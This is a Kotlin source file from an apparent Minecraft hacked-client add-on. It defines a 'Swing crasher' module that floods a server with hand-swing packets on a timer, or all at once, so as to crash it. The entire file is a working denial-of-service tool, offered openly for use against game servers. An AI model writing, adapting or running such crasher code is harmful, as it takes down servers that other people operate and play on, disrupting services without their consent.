package su.mandora.tarasande_crasher.module

import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket
import net.minecraft.util.Hand
import su.mandora.tarasande.event.impl.EventDisconnect
import su.mandora.tarasande.event.impl.EventUpdate
import su.mandora.tarasande.system.base.valuesystem.impl.ValueMode
import su.mandora.tarasande.system.base.valuesystem.impl.ValueNumber
import su.mandora.tarasande.system.feature.modulesystem.Module
import su.mandora.tarasande.util.math.TimeUtil
import su.mandora.tarasande.util.string.StringUtil
import su.mandora.tarasande_crasher.CRASHER
import su.mandora.tarasande_crasher.forcePacket

class ModuleSwingCrasher : Module("Swing crasher", "Crashes the server with spamming swing packets", CRASHER) {

    private val mode = ValueMode(this, "Mode", false, "Player tick", "Only once")
    private val delay = ValueNumber(this, "Delay", 5.0, 50.0, 100.0, 5.0, isEnabled = { mode.isSelected(0) })
    private val hand = ValueMode(this, "Hand", false, *Hand.values().map { StringUtil.formatEnumTypes(it.name) }.toTypedArray())
    private val repeat = ValueNumber(this, "Repeat", 1.0, 3.0, 10.0, 1.0)

    private val timer = TimeUtil()

    init {
        registerEvent(EventDisconnect::class.java) {
            switchState()
        }
        registerEvent(EventUpdate::class.java) { event ->
            if(event.state == EventUpdate.State.PRE) {
                if (mode.isSelected(0)) {
                    if (timer.hasReached(delay.value.toLong())) {
                        repeat(repeat.value.toInt()) {
                            forcePacket(HandSwingC2SPacket(if (hand.isSelected(0)) Hand.MAIN_HAND else Hand.OFF_HAND))
                        }
                        timer.reset()
                    }
                } else {
                    repeat(repeat.value.toInt()) {
                        forcePacket(HandSwingC2SPacket(if (hand.isSelected(0)) Hand.MAIN_HAND else Hand.OFF_HAND))
                    }
                    switchState()
                }
            }
        }
    }
}
